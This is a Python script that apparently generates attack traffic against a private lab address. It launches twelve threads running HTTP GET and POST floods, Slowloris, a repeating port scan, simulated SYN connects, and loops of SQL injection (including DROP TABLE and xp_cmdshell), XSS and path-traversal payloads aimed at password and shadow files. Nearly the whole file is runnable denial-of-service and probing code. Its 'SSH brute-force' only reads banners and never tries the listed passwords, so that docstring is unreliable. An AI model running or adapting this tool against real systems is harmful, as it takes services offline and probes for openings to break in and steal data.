"""
attack.py — Maximum intensity attack traffic generator.

All attack types run at full throttle simultaneously:
  - HTTP flood        : 10 concurrent threads, zero sleep
  - Port scan         : continuous raw socket sweep every 10s
  - SSH brute-force   : rapid TCP connections to port 22
  - Web vuln scan     : SQLi, XSS, path traversal probes
  - Slowloris         : 200 half-open connections held open
  - SYN flood sim     : rapid SYN-only TCP connects

MODE and INTENSITY are read from env but all are forced to max.
"""

import os
import time
import socket
import random
import subprocess
import threading
import requests
from requests.exceptions import RequestException

TARGET_IP = os.environ.get("TARGET_IP", "172.20.0.10")
MODE      = "mixed"      # always mixed regardless of env
INTENSITY = "high"

# Zero sleep = absolute maximum rate
RATE = 0.0

print(f"[attacker] TARGET={TARGET_IP} MODE={MODE} INTENSITY=MAX")
time.sleep(3)  # let target settle

# ── Payloads ─────────────────────────────────────────────────────

SCAN_PATHS = [
    "/wp-login.php", "/admin", "/phpmyadmin", "/.env", "/.git/config",
    "/config.php", "/backup.zip", "/shell.php", "/cmd.php", "/exec",
    "/api/v1/users", "/api/v1/admin", "/api/debug", "/server-status",
    "/actuator/env", "/actuator/heapdump", "/cgi-bin/test.cgi",
    "/.htpasswd", "/web.config", "/etc/passwd", "/proc/self/environ",
]

SQLI_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1 --", "1; DROP TABLE users; --",
    "' UNION SELECT username,password FROM users --",
    "admin'--", "1' AND SLEEP(5)--", "'; EXEC xp_cmdshell('whoami')--",
    "1 OR 1=1", "' OR ''='", "1; SELECT * FROM information_schema.tables--",
]

XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(document.cookie)",
    "';alert(String.fromCharCode(88,83,83))//",
    "<svg onload=alert(1)>",
]

UA_POOL = [
    "Mozilla/5.0 (compatible; Googlebot/2.1)",
    "python-requests/2.28.0", "curl/7.68.0", "Masscan/1.0",
    "zgrab/0.x", "Nikto/2.1.6", "sqlmap/1.7", "WPScan v3.8.22",
    "libwww-perl/6.43", "", "Go-http-client/1.1",
]

SSH_USERS = ["root","admin","ubuntu","user","test","guest","pi","oracle","deploy","jenkins"]
SSH_PWDS  = ["123456","password","admin","root","toor","letmein","test123","qwerty","abc123"]

PORTS_TO_SCAN = [21,22,23,25,80,443,445,3306,3389,5432,5900,6379,8080,8443,27017,1433,9200]

# ── Attack functions ──────────────────────────────────────────────

def http_flood():
    """Zero-sleep HTTP flood — absolute maximum rate."""
    print("[attacker] HTTP flood started (max rate)")
    session = requests.Session()
    session.max_redirects = 0
    count = 0
    while True:
        try:
            ua = random.choice(UA_POOL)
            headers = {"User-Agent": ua} if ua else {}
            path = random.choice(["/", "/api/v1", "/admin"] + SCAN_PATHS)
            session.get(f"http://{TARGET_IP}{path}", headers=headers, timeout=1)
            count += 1
            if count % 500 == 0:
                print(f"[attacker] HTTP flood: {count} requests")
        except Exception:
            pass

def http_flood_post():
    """POST flood with random bodies."""
    print("[attacker] HTTP POST flood started")
    session = requests.Session()
    while True:
        try:
            payload = {"user": random.choice(SSH_USERS), "pass": random.choice(SSH_PWDS)}
            session.post(f"http://{TARGET_IP}/wp-login.php", data=payload, timeout=1)
            session.post(f"http://{TARGET_IP}/admin", data=payload, timeout=1)
        except Exception:
            pass

def port_scan():
    """Raw socket port scan — continuous sweep."""
    print("[attacker] Port scan started")
    while True:
        for port in PORTS_TO_SCAN:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                s.connect((TARGET_IP, port))
                s.close()
            except Exception:
                pass
        time.sleep(5)

def web_vuln_scan():
    """SQLi + XSS + path traversal at maximum rate."""
    print("[attacker] Web vuln scan started")
    session = requests.Session()
    while True:
        for payload in SQLI_PAYLOADS:
            try:
                session.get(f"http://{TARGET_IP}/api/v1",
                    params={"id": payload, "user": payload, "q": payload}, timeout=1)
                session.post(f"http://{TARGET_IP}/admin",
                    data={"username": payload, "password": payload}, timeout=1)
            except Exception:
                pass
        for payload in XSS_PAYLOADS:
            try:
                session.get(f"http://{TARGET_IP}/",
                    params={"search": payload, "q": payload, "msg": payload}, timeout=1)
            except Exception:
                pass
        for path in SCAN_PATHS:
            try:
                session.get(f"http://{TARGET_IP}{path}", timeout=1)
            except Exception:
                pass

def ssh_brute_force():
    """Rapid SSH brute-force via raw TCP."""
    print("[attacker] SSH brute-force started")
    while True:
        for user in SSH_USERS:
            for pwd in SSH_PWDS:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((TARGET_IP, 22))
                    s.recv(256)
                    s.close()
                except Exception:
                    pass

def slow_loris():
    """Hold 200 half-open HTTP connections simultaneously."""
    print("[attacker] Slowloris started (200 sockets)")
    sockets = []
    while True:
        # Open new sockets up to 200
        while len(sockets) < 200:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((TARGET_IP, 80))
                s.send(b"GET / HTTP/1.1\r\nHost: target\r\nAccept: */*\r\n")
                sockets.append(s)
            except Exception:
                break
        # Keep alive
        for s in list(sockets):
            try:
                s.send(b"X-Keep: alive\r\n")
            except Exception:
                sockets.remove(s)
        print(f"[attacker] Slowloris holding {len(sockets)} connections")
        time.sleep(8)

def syn_flood():
    """Rapid SYN connections — open and immediately close."""
    print("[attacker] SYN flood started")
    while True:
        for port in [80, 443, 22, 8080]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.1)
                s.connect_ex((TARGET_IP, port))
                s.close()
            except Exception:
                pass

def directory_traversal():
    """Path traversal and LFI attempts."""
    print("[attacker] Directory traversal started")
    session = requests.Session()
    traversal_payloads = [
        "../../etc/passwd", "../../../etc/shadow",
        "%2e%2e%2fetc%2fpasswd", "....//....//etc/passwd",
        "/etc/passwd%00", "..%252f..%252f..%252fetc%252fpasswd",
    ]
    while True:
        for p in traversal_payloads:
            try:
                session.get(f"http://{TARGET_IP}/download?file={p}", timeout=1)
                session.get(f"http://{TARGET_IP}/read?path={p}", timeout=1)
                session.get(f"http://{TARGET_IP}/?page={p}", timeout=1)
            except Exception:
                pass

# ── Launch ALL attack threads simultaneously at max intensity ─────

threads = [
    # HTTP flood — 5 concurrent threads for maximum request rate
    threading.Thread(target=http_flood,          daemon=True, name="flood-1"),
    threading.Thread(target=http_flood,          daemon=True, name="flood-2"),
    threading.Thread(target=http_flood,          daemon=True, name="flood-3"),
    threading.Thread(target=http_flood,          daemon=True, name="flood-4"),
    threading.Thread(target=http_flood,          daemon=True, name="flood-5"),
    threading.Thread(target=http_flood_post,     daemon=True, name="flood-post"),
    threading.Thread(target=port_scan,           daemon=True, name="portscan"),
    threading.Thread(target=web_vuln_scan,       daemon=True, name="vulnscan"),
    threading.Thread(target=ssh_brute_force,     daemon=True, name="ssh-brute"),
    threading.Thread(target=slow_loris,          daemon=True, name="slowloris"),
    threading.Thread(target=syn_flood,           daemon=True, name="synflood"),
    threading.Thread(target=directory_traversal, daemon=True, name="lfi"),
]

for t in threads:
    t.start()
    time.sleep(0.2)  # stagger start slightly

print(f"[attacker] ALL {len(threads)} attack threads running at MAX intensity")
while True:
    time.sleep(30)
    alive = sum(1 for t in threads if t.is_alive())
    print(f"[attacker] {alive}/{len(threads)} threads alive | target={TARGET_IP}")
